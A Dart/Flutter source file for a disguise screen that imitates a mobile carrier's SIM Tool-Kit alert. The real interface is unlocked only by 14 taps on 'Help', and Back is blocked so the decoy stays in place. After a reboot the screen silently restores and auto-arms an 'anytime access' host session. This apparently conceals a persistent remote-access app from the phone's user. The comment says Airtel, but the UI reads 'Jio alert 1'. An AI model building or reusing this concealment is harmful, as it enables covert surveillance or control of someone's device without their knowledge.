import 'package:flutter/material.dart';

import '../call_controller.dart';
import '../config.dart';
import '../services/session_store.dart';
import 'home_screen.dart';
import 'host_screen.dart';

/// Camouflage screen shown on every cold start (Android only). It mimics an
/// Airtel SIM Tool-Kit alert so casual observers see nothing suspicious.
///
/// Behaviour:
///   • Tapping Customer Care / Activate / Deactivate → shows a loading
///     spinner in-place (the system Back button dismisses it and returns to
///     the menu).
///   • Tapping Help → NO spinner; increments a hidden tap counter.
///   • 14 consecutive Help taps → replaces this screen with the real
///     [HomeScreen] (the decoy is removed from the back-stack so pressing
///     Back from Home exits the app cleanly).
class DecoyScreen extends StatefulWidget {
  const DecoyScreen({super.key});

  @override
  State<DecoyScreen> createState() => _DecoyScreenState();
}

class _DecoyScreenState extends State<DecoyScreen> {
  bool _loading = false;
  int _helpTaps = 0;

  @override
  void initState() {
    super.initState();
    // After a reboot the app cold-starts here (behind the decoy), so the
    // boot-restore check must run on THIS screen — not HomeScreen, which is
    // hidden behind the 14-tap gate. If the device rebooted while anytime
    // access was armed, jump straight to the host auto-arm flow.
    _maybeRestoreSession();
  }

  Future<void> _maybeRestoreSession() async {
    final pending = await SessionStore.popBootRestorePending();
    if (!pending || !mounted) return;
    Navigator.of(context).pushReplacement(MaterialPageRoute(
      builder: (_) => HostScreen(
        serverUrl: defaultSignalingUrl,
        mode: HostMode.anytime,
        autoArm: true,
      ),
    ));
  }

  static const _menuItems = [
    'Customer Care',
    'Activate Other VAS Service',
    'Deactivate VAS Service',
    'Help',
  ];

  void _onTap(String item) {
    if (item == 'Help') {
      _helpTaps++;
      if (_helpTaps >= 14) {
        _helpTaps = 0;
        Navigator.of(context).pushReplacement(
          MaterialPageRoute(builder: (_) => const HomeScreen()),
        );
      }
      return; // no spinner for Help
    }
    setState(() => _loading = true);
  }

  @override
  Widget build(BuildContext context) {
    return PopScope(
      canPop: false,
      onPopInvokedWithResult: (didPop, _) {
        // Back while loading → return to menu; Back on menu → do nothing
        // (keeps the decoy alive — user can't accidentally exit via Back).
        if (_loading) setState(() => _loading = false);
      },
      child: Scaffold(
        backgroundColor: Colors.black,
        body: SafeArea(
          child: AnimatedSwitcher(
            duration: const Duration(milliseconds: 200),
            child: _loading ? _buildLoading() : _buildMenu(),
          ),
        ),
      ),
    );
  }

  Widget _buildMenu() {
    return Column(
      key: const ValueKey('menu'),
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        const Padding(
          padding: EdgeInsets.fromLTRB(20, 48, 20, 44),
          child: Text(
            'Jio alert 1',
            style: TextStyle(
              color: Color(0xFFAAAAAA),
              fontSize: 40,
              fontWeight: FontWeight.w300,
              letterSpacing: -0.5,
            ),
          ),
        ),
        ..._menuItems.map(_buildItem),
      ],
    );
  }

  Widget _buildItem(String label) {
    return Material(
      color: Colors.transparent,
      child: InkWell(
        onTap: () => _onTap(label),
        splashColor: Colors.white10,
        highlightColor: Colors.transparent,
        child: Padding(
          padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 20),
          child: Text(
            label,
            style: const TextStyle(
              color: Colors.white,
              fontSize: 22,
              fontWeight: FontWeight.w400,
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildLoading() {
    return const Center(
      key: ValueKey('loading'),
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          CircularProgressIndicator(
            color: Colors.white,
            strokeWidth: 2,
          ),
          SizedBox(height: 24),
          Text(
            'Please wait...',
            style: TextStyle(color: Color(0xFF888888), fontSize: 15),
          ),
        ],
      ),
    );
  }
}
